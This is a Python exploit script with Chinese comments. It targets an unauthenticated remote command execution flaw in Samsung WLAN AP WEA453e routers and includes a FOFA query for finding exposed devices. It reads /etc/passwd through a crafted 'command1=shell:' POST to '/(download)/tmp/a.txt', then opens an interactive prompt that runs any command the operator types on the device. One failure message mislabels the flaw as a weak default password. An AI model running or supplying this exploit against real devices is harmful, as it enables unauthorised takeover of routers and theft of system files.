import requests

"""
三星 WLAN AP WEA453e路由器  存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限
漏洞影响:三星 WLAN AP WEA453e路由器
FOFA title=="Samsung WLAN AP"
"""

def POC_1(target_url):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
    try:
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:
            print("\033[36m[o] 目标 {} 存在漏洞, 响应为:\n{}\033[0m".format(target_url, response.text))
            while True:
                cmd = str(input("\033[35mCmd >>> \033[0m"))
                POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 目标 {} 不存在默认管理员弱口令     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:{}| dd of=/tmp/a.txt".format(cmd)
    try:
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[36m{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
